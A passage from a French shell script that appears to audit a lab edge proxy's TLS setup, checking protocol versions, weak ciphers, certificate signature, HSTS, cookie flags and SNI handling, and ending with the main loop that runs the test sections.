  out=$(tlsrun -tls1_2); case "$out" in *"Protocol  : TLSv1.2"*|*"Protocol: TLSv1.2"*) info "TLS 1.2 accepté";; *) info "TLS 1.2 refusé";; esac
  for p in tls1 tls1_1; do
    out=$(SNI= tlsrun -$p -cipher 'ALL:@SECLEVEL=0' 2>&1)
    case "$out" in
      *"no protocols available"*|*"unknown option"*|*"unsupported protocol"*|*"Unrecognized option"*) skip "$p : non testable depuis ce client OpenSSL";;
      *"Cipher is (NONE)"*|*"handshake failure"*|*"alert protocol version"*|*"wrong version number"*|*"no peer certificate"*) ok "$p refusé";;
      *"Protocol  : TLSv1"*|*"Protocol: TLSv1"*) ko "$p accepté (protocole obsolète)";;
      *) ok "$p refusé (aucune session établie)";;
    esac
  done
  for c in 'RC4' '3DES:DES' 'EXPORT' 'NULL:eNULL:aNULL'; do
    out=$(tlsrun -tls1_2 -cipher "$c:@SECLEVEL=0" 2>&1)
    case "$out" in
      *"no cipher match"*|*"Error with command"*) skip "suites $c : indisponibles dans ce client OpenSSL";;
      *"Cipher is (NONE)"*|*"handshake failure"*|*"no shared cipher"*|*"alert"*) ok "suites faibles $c refusées";;
      *"Cipher    : "*|*"Cipher is "*) ko "suite faible acceptée ($c) : $(echo "$out" | grep -m1 'Cipher is')";;
      *) ok "suites faibles $c refusées";;
    esac
  done
  out=$(tlsrun -tls1_3 -alpn h2,http/1.1); case "$out" in *"ALPN protocol: h2"*) ok "ALPN : h2 négocié";; *) info "ALPN : h2 non négocié ($(echo "$out" | grep -m1 ALPN))";; esac
  check "requête HTTP/2" "$(curl -sk --http2 -o /dev/null -w '%{http_version}' "$(us tls)/whoami")" 2
  out=$(tlsrun -tls1_3 -showcerts)
  echo "$out" | tr -d '\000' | grep -q "Compression: NONE" && ok "compression TLS désactivée" || info "compression TLS : $(echo "$out" | tr -d '\000' | grep -m1 -i compression)"
  cn=$(echo "$out" | openssl x509 -noout -text 2>/dev/null)
  sig=$(echo "$cn" | grep -m1 'Signature Algorithm' | awk '{print $3}'); bits=$(echo "$cn" | grep -m1 -E 'Public-Key|ASN1 OID' )
  case "$sig" in *md5*|*sha1*|*SHA1*|*MD5*) ko "signature faible du certificat ($sig)";; *) ok "signature du certificat : $sig";; esac
  info "clé publique : $bits"
  hdr=$(curl -sk -D- -o /dev/null "$(us tls)/whoami" | tr -d '\r')
  echo "$hdr" | grep -qi '^strict-transport-security: .*max-age=31536000' && ok "HSTS (max-age 1 an)" || ko "HSTS absent ou court"
  echo "$hdr" | grep -qi '^alt-svc' && info "Alt-Svc présent (HTTP/3 annoncé)" || info "Alt-Svc absent"
  jar=$(curl -sk -D- -o /dev/null "$(us tls)/whoami" | tr -d '\r' | grep -i '^set-cookie: LABSID')
  if [ -z "$jar" ]; then ko "cookie LABSID absent"; else
    case "$jar" in *[Ss]ecure*) ok "cookie sticky : Secure";; *) ko "cookie sticky sans Secure sur HTTPS";; esac
    case "$jar" in *[Hh]ttp[Oo]nly*) ok "cookie sticky : HttpOnly";; *) ko "cookie sticky sans HttpOnly";; esac
    case "$jar" in *[Ss]ame[Ss]ite*) ok "cookie sticky : SameSite";; *) ko "cookie sticky sans SameSite";; esac
  fi
  out=$(curl -sk -o /dev/null -w '%{http_code}' -H 'Host: lab-sec-plain.lab.test' "$(us tls)/whoami"); info "SNI lab-sec-tls avec Host d'une autre route : $out (certificat commun *.lab.test)"
  out=$(SNI=inconnu.invalid tlsrun -tls1_3 | grep -m1 'subject=' ); info "SNI inconnu : ${out:-aucun certificat présenté}"
  out=$(curl -s -o /dev/null -w '%{http_code} %{redirect_url}' -H 'Host: lab-sec-tls.lab.test' "http://$EDGE_HOST/whoami"); info "HTTP clair vers une route TLS : $out"
  out=$(tlsrun -tls1_3 -status | grep -m1 -i 'OCSP'); info "agrafage OCSP : ${out:-non annoncé (certificat auto-signé)}"
  echo "$(tlsrun -tls1_2 -reconnect | grep -c 'Reused')" | grep -qE '^[1-9]' && info "reprise de session TLS 1.2 : active" || info "reprise de session TLS 1.2 : non observée"
  tlsrun -tls1_2 | grep -q 'Secure Renegotiation IS supported' && ok "renégociation sécurisée (RFC 5746)" || info "renégociation sécurisée : non annoncée en TLS 1.2"
}

# ------------------------------------------------------------------ main
mode=${1:-all}; SECTIONS=${2:-}
case "$mode" in
  seed) seed; exit 0 ;;
  run|all) ;;
  *) echo "usage : security.sh [seed|run [sections]|all]"; exit 2 ;;
esac
[ "$mode" = all ] && seed
if [ -n "${LAB_ADMIN_TOKEN:-}${LAB_ADMIN_EMAIL:-}" ]; then . /lab/scripts/auth.sh 2>/dev/null; fi
preflight
for s in trust acl ratelimit inject protocol waf cache ws jwt errleak admin spoof rights bans ephor tarpit decoys challenge ipcontrols geoip mtls asn http3 internal redirect tls; do "t_$s"; guard; done
echo; echo "Bilan : $npass PASS, $fail FAIL, $nskip ignorés"
exit $fail
